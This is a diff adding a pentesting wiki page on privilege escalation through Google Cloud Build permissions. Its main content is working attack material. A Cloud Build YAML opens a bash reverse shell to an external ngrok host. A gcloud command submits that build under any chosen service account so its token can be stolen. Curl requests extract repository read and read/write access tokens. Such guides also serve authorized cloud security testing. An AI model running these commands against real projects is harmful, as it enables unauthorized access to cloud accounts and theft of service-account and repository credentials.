@@ -1,0 +1,89 @@
+# GCP - Cloudbuild Privesc
+
+## cloudbuild
+
+For more information about Cloud Build check:
+
+### `cloudbuild.builds.create`, `iam.serviceAccounts.actAs`
+
+With this permission you can **submit a cloud build**. The cloudbuild machine will have in it’s filesystem by **default a token of the cloudbuild Service Account**: `<PROJECT_NUMBER>@cloudbuild.gserviceaccount.com`. However, you can **indicate any service account inside the project** in the cloudbuild configuration.\
+Therefore, you can just make the machine exfiltrate to your server the token or **get a reverse shell inside of it and get yourself the token** (the file containing the token might change).
+
+#### Direct exploitation via gcloud CLI
+
+1- Create `cloudbuild.yaml` and modify with your listener data
+
+<details><summary>Cloud Build YAML configuration for reverse shell</summary>
+
+```yaml
+steps:
+  - name: bash
+    script: |
+      #!/usr/bin/env bash
+      bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/14965 0>&1
+options:
+  logging: CLOUD_LOGGING_ONLY
+```
+
+</details>
+
+2- Upload a simple build with no source, the yaml file and specify the SA to use on the build:
+
+<details><summary>Submit Cloud Build with specified service account</summary>
+
+```bash
+gcloud builds submit --no-source --config="./cloudbuild.yaml" --service-account="projects/<PROJECT>/serviceAccounts/<SERVICE_ACCOUNT_ID>@<PROJECT_ID>.iam.gserviceaccount.com
+```
+
+</details>
+
+#### Using python gcloud library
+You can find the original exploit script [**here on GitHub**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudbuild.builds.create.py) (but the location it's taking the token from didn't work for me). Therefore, check a script to automate the [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/f-cloudbuild.builds.create.sh) and a python script to get a reverse shell inside the cloudbuild machine and [**steal it here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/f-cloudbuild.builds.create.py) (in the code you can find how to specify other service accounts)**.**
+
+For a more in-depth explanation, visit [https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/](https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/)
+
+### `cloudbuild.repositories.accessReadToken`
+
+With this permission the user can get the **read access token** used to access the repository:
+
+<details><summary>Get read access token for repository</summary>
+
+```bash
+curl -X POST \
+     -H "Authorization: Bearer $(gcloud auth print-access-token)" \
+     -H "Content-Type: application/json" \
+     -d '{}' \
+     "https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadToken"
+```
+
+</details>
+
+### `cloudbuild.repositories.accessReadWriteToken`
+
+With this permission the user can get the **read and write access token** used to access the repository:
+
+<details><summary>Get read and write access token for repository</summary>
+
+```bash
+curl -X POST \
+     -H "Authorization: Bearer $(gcloud auth print-access-token)" \
+     -H "Content-Type: application/json" \
+     -d '{}' \
+     "https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadWriteToken"
+```
+
+</details>
+
+### `cloudbuild.connections.fetchLinkableRepositories`
+
+With this permission you can **get the repos the connection has access to:**
+
+<details><summary>Fetch linkable repositories</summary>
+
+```bash
+curl -X GET \
+     -H "Authorization: Bearer $(gcloud auth print-access-token)" \
+     "https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>:fetchLinkableRepositories"
+```
+
+</details>
